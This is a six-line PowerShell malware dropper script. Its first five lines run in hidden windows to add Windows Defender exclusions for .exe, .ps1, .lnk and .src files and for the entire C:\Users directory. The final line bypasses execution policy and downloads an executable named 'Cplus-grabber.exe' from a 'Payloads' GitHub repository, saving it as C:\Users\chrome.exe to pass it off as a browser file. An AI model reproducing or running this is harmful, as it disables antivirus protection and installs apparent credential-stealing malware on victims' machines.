powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".exe"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".ps1"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".src"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionPath "C:\Users"
powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/rude90/Payloads/raw/main/Cplus-grabber.exe -o C:\Users\chrome.exe
